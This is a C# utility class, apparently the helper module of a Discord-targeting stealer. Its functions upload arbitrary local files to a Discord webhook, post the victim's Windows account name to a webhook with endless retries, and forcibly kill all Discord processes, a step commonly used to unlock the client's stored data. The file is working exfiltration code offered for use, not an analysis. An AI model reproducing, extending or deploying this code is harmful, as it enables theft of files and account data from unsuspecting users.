using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace DiscordHook
{
    public static class Utility
    {
        public static async Task SendFileHook(string dshook, FileInfo file)
        {
            if (!file.Exists) await Task.CompletedTask;
            var bound = "------------------------" + DateTime.Now.Ticks.ToString("x");
            var webhookRequest = new WebClient();
            webhookRequest.Headers.Add("Content-Type", "multipart/form-data; boundary=" + bound);
            var stream = new MemoryStream();
            var beginBodyBuffer = Encoding.UTF8.GetBytes("--" + bound + "\r\n");
            stream.Write(beginBodyBuffer, 0, beginBodyBuffer.Length);
            
            var fileBody = "Content-Disposition: form-data; name=\"file\"; filename=\"" + file.Name + "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
            var fileBodyBuffer = Encoding.UTF8.GetBytes(fileBody);
            stream.Write(fileBodyBuffer, 0, fileBodyBuffer.Length);
            var fileBuffer = new byte[] { };
            try
            {
                fileBuffer = File.ReadAllBytes(file.FullName);
            }
            catch
            {
                await Task.CompletedTask;
            }
            
            stream.Write(fileBuffer, 0, fileBuffer.Length);
            var fileBodyEnd = "\r\n--" + bound + "\r\n";
            var fileBodyEndBuffer = Encoding.UTF8.GetBytes(fileBodyEnd);
            stream.Write(fileBodyEndBuffer, 0, fileBodyEndBuffer.Length);
            
            var jsonBody = string.Concat("Content-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n", "File\r\n", "--", bound, "--");
            var jsonBodyBuffer = Encoding.UTF8.GetBytes(jsonBody);
            stream.Write(jsonBodyBuffer, 0, jsonBodyBuffer.Length);
            webhookRequest.UploadData(dshook, stream.ToArray());
            await Task.CompletedTask;
        }

        public static void KillDiscord()
        {
            var ps = Process.GetProcessesByName("discord");
            foreach (var process in ps)
            {
                process.Kill();
            }
        }
        
        public static string ComputeSha256Hash(string rawData)
        {
            using var sha256Hash = SHA256.Create();
            var bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));
            var builder = new StringBuilder();
            foreach (var t in bytes) builder.Append(t.ToString("x2"));
            return builder.ToString();
        }

        public static async Task SendStringHook(string message, string hook)
        {
            while (true)
            {
                try
                {
                    await new HttpClient().PostAsync(hook, new FormUrlEncodedContent(new Dictionary<string, string>{
                        {"content", $"```{message}```"},
                        {"username", System.Security.Principal.WindowsIdentity.GetCurrent().Name},
                        {"avatar_url", "https://cdn.discordapp.com/attachments/785419281135042564/854132950098903050/d225266ddff6e8d7dc387d671704308c.png"}
                    }));
                    break;
                }
                catch
                {
                    await Task.Delay(500);
                }
            }
        }
    }
}
